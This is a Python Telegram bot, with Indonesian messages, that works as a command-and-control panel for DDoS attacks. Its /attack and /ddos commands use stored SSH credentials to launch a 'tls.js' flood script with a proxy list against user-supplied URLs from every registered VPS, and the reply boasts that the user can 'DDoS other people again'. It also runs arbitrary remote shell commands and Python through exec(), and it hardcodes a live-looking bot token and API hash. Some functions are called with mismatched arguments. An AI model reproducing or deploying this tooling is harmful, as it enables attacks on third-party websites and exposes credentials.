from pyrogram import Client, filters
import paramiko
import json
import os
import subprocess
import time
import time
import subprocess
import validators
from pyrogram import Client, filters
from pyrogram.types import Message


BOT_TOKEN = "7881482388:AAGp8gYPg6CJh_iXNtuGYeEin7EF0UpAOlg"
API_ID = 26323194          
API_HASH = "b85b75c7631c4aabc6084a2202952f67"    

VPS_FILE = "vps_list.json"

def check_code_running(host, port, username, password):
    command = "ps aux"
    result = execute_ssh_command(host, port, username, password, command)
    keywords = [
        "python",        
        "python3",       
        "php",     
        "node",   
        "java",    
        "ruby",         
        "perl",        
        "c++",          
        "c",             
        "go",            
        "rust",        
        "html",         
        "css",           
        "javascript",    
        "bash",          
        "sh",         
        "swift",      
        "typescript",   
        "scala",      
        "kotlin",      
        "lua"            
    ]
    
    for keyword in keywords:
        if keyword in result:
            return True 
    return False 



def load_vps():
    if not os.path.exists(VPS_FILE):
        return []
    with open(VPS_FILE, "r") as file:
        try:
            return json.load(file)
        except json.JSONDecodeError:
            return []

def save_vps(vps_list):
    with open(VPS_FILE, "w") as file:
        json.dump(vps_list, file, indent=4)

def execute_ssh_command(host, port, username, password, command):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=password)

        if command.startswith('apt'):
            command = f"echo {password} | sudo -S {command}"

        stdin, stdout, stderr = ssh.exec_command(command)

        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()
        ssh.close()

        return output if output else error
    except Exception as e:
        return f"Error: {str(e)}"

def execute_shell_command(host, port, username, password, command):
    return execute_ssh_command(host, port, username, password, command)

def evaluate_python_code(code):
    try:
        exec_globals = {}
        exec(code, exec_globals)
        result = exec_globals.get("result", "No result returned.")
        return str(result)
    except Exception as e:
        return f"Error: {str(e)}"

def is_screen_session_active(host, port):
    session_name = f"vps_{host}_{port}"
    check_command = f"screen -ls | grep {session_name}"
    result = execute_ssh_command(host, port, username, password, check_command)
    return bool(result)

def execute_ssh_command_in_existing_screen(host, port, username, password, command):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=password)
        screen_command = f"screen -S existing_screen_name -X stuff '{command}\n'"
        stdin, stdout, stderr = ssh.exec_command(screen_command)
        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()
        ssh.close()

        return output if output else error
    except Exception as e:
        return f"Error: {str(e)}"


def create_new_screen_and_run_command(host, port, username, password, command):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=password)
        screen_command = f"screen -dm bash -c '{command}; exec bash'"
        stdin, stdout, stderr = ssh.exec_command(screen_command)

        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()
        ssh.close()

        return output if output else error
    except Exception as e:
        return f"Error: {str(e)}"


app = Client("bot", bot_token=BOT_TOKEN, api_id=API_ID, api_hash=API_HASH)


tls_script = "tls.js"
proxy_file = "proxy.txt"

if not os.path.isfile(tls_script):
    raise FileNotFoundError(f"Error: File {tls_script} tidak ditemukan.")

if not os.path.isfile(proxy_file):
    raise FileNotFoundError(f"Error: File {proxy_file} tidak ditemukan.")


@app.on_message(filters.command("attack") & filters.private)
async def run_attack_script(client: Client, message: Message):
    await message.reply("Masukkan URL atau beberapa URL (pisahkan dengan koma):")

    user_input = await app.listen(message.chat.id)
    urls = [url.strip() for url in user_input.text.split(",")] 
    valid_urls = []
    for url in urls:
        if validators.url(url):
            valid_urls.append(url)
        else:
            await message.reply(f"[SKIP] URL tidak valid: {url}")

    if not valid_urls:
        await message.reply("Tidak ada URL yang valid. Program dihentikan.")
        return

    vps_list = load_vps()

    if not vps_list:
        await message.reply("Tidak ada VPS yang terdaftar.")
        return

    try:
        for vps in vps_list:
            host = vps['host']
            port = vps['port']
            username = vps['username']
            password = vps['password']

            for url in valid_urls:
                session_name = f"attack_{url.replace('http://', '').replace('https://', '').replace('/', '_')}"
                command = f"node {tls_script} {url} 600 64 10 {proxy_file}"

                if is_screen_session_active(host, port, username, password, session_name):
                    result_message = execute_ssh_command(host, port, username, password, f"screen -S {session_name} -X stuff '{command}\n'")
                    await message.reply(f"[INFO] Menjalankan perintah di screen aktif: {session_name}\n{result_message}")
                else:
                    result_message = create_new_screen_and_run_command(host, port, username, password, command)
                    await message.reply(f"[INFO] Screen baru dibuat untuk URL: {url} di VPS {host}\n{result_message}")

                time.sleep(5)

    except Exception as e:
        return await message.reply(f"[FATAL] Kesalahan sistem: {e}")


@app.on_message(filters.command("addvps"))
async def add_vps(client, message):
    try:
        _, host, port, username, password = message.text.split(maxsplit=4)
        port = int(port)
        vps_list = load_vps()
        for vps in vps_list:
            if vps["host"] == host and vps["port"] == port:
                await message.reply("VPS ini sudah terdaftar.")
                return
        vps_list.append({"host": host, "port": port, "username": username, "password": password})
        save_vps(vps_list)
        await message.reply(f"VPS {host}:{port} berhasil ditambahkan!")
    except ValueError:
        await message.reply("Gunakan format: /addvps [host] [port] [username] [password]")


@app.on_message(filters.command("delvps"))
async def del_vps(client, message):
    try:
        _, host, port = message.text.split(maxsplit=2)
        port = int(port)
        vps_list = load_vps()
        for vps in vps_list:
            if vps["host"] == host and vps["port"] == port:
                vps_list.remove(vps)
                save_vps(vps_list)
                await message.reply(f"VPS {host}:{port} berhasil dihapus!")
                return

        await message.reply("VPS tidak ditemukan dalam daftar.")
    except ValueError:
        await message.reply("Gunakan format: /delvps [host] [port]")


@app.on_message(filters.command("listvps"))
async def list_vps(client, message):
    vps_list = load_vps()
    if vps_list:
        reply = "Daftar VPS yang terhubung:\n"
        for vps in vps_list:
            is_running = check_code_running(vps['host'], vps['port'], vps['username'], vps['password'])
            status = "Sedang berjalan" if is_running else "Tidak berjalan"
            reply += f"- {vps['host']}:{vps['port']} (user: {vps['username']}) - {status}\n"
        await message.reply(reply)
    else:
        await message.reply("Tidak ada VPS yang terdaftar.")


@app.on_message(filters.command("bot"))
async def bot_command(client, message):
    try:
        command = message.text.split(" ", 1)[1]
        vps_list = load_vps()

        if not vps_list:
            await message.reply("Tidak ada VPS yang terdaftar.")
            return
        results = []

        for vps in vps_list:
            host = vps['host']
            port = vps['port']
            username = vps['username']
            password = vps['password']
            result = execute_ssh_command(host, port, username, password, command)
            results.append(f"Hasil perintah di VPS {host}:{port}:\n{result}")
        await message.reply("\n\n".join(results))

    except IndexError:
        await message.reply("Gunakan format: /bot command")

@app.on_message(filters.command("ddos"))
async def bot_command(client, message):
    try:
        command = message.text.split(" ", 1)[1]
        vps_list = load_vps()

        if not vps_list:
            await message.reply("Tidak ada VPS yang terdaftar.")
            return

        results = []

        for vps in vps_list:
            host = vps['host']
            port = vps['port']
            username = vps['username']
            password = vps['password']
            result = execute_ssh_command_in_existing_screen(host, port, username, password, command)
            results.append(f"Hasil perintah di VPS {host}:{port}:\n{result}")
            new_screen_result = create_new_screen_and_run_command(host, port, username, password, command)
            results.append(f"Perintah dijalankan di screen baru di VPS {host}:{port}:\n{new_screen_result}")
        return await message.reply("Done sekarang lu bisa ddos orang lain lagi")

    except IndexError:
        return await message.reply("Gunakan format: /ddos [command]")

@app.on_message(filters.command("lihat"))
async def shell(client, message):
    try:
        _, host, command = message.text.split(maxsplit=2)
        vps_list = load_vps()
        vps = next((v for v in vps_list if v['host'] == host), None)
        
        if not vps:
            await message.reply(f"VPS dengan IP {host} tidak terdaftar.")
            return
        port = vps['port']
        username = vps['username']
        password = vps['password']
        result = execute_ssh_command(host, port, username, password, command)
        await message.reply(f"Hasil perintah di VPS {host}:{port}:\n{result}")
    
    except ValueError:
        await message.reply("Gunakan format: /lihat [host] [command]")



def execute_ssh_command_in_screen(host, port, username, password, command):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=password)
        screen_command = f"screen -dmS mysession {command}"
        stdin, stdout, stderr = ssh.exec_command(screen_command)
        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()
        ssh.close()

        return output if output else error
    except Exception as e:
        return f"Error: {str(e)}"


@app.on_message(filters.command("lihatall"))
async def shell(client, message):
    try:
        _, command = message.text.split(maxsplit=1)
        vps_list = load_vps()
        
        if not vps_list:
            await message.reply("Tidak ada VPS yang terdaftar.")
            return
        results = []
        
        for vps in vps_list:
            host = vps['host']
            port = vps['port']
            username = vps['username']
            password = vps['password']
            result = execute_ssh_command_in_screen(host, port, username, password, command)
            results.append(f"Hasil perintah di VPS {host}:{port} (dalam screen):\n{result}")
        await message.reply("\n\n".join(results))
    
    except ValueError:
        await message.reply("Gunakan format: /shell [command]")




@app.on_message(filters.command("eval"))
async def eval_code(client, message):
    try:
        code = message.text.split(" ", 1)[1]
        result = evaluate_python_code(code)
        await message.reply(f"Hasil evaluasi:\n{result}")
    except IndexError:
        await message.reply("Gunakan format: /eval [code]")


# @app.on_message(filters.command("help"))
# async def help(client, message):
#     helpss = """
# /addvps tambah vps
# /listvps daftar vps
# /delvps hapus vps
# /ddos ya ddos
# /attack ya attack



# """
@app.on_message(filters.command("help"))
async def help(client, message):
    helpss = (
        "<b>📜 Help Menu:</b>\n\n"
        "/addvps - Tambah VPS\n"
        "/listvps - Daftar VPS\n"
        "/delvps - Hapus VPS\n"
        "/ddos - Ya DDOS\n"
        "/attack - Ya Attack\n"
    )

    return await message.reply(helpss)


if __name__ == "__main__":
    print("Bot sudah berjalan... Kirimkan perintah ke bot untuk memulai.")
    app.run()
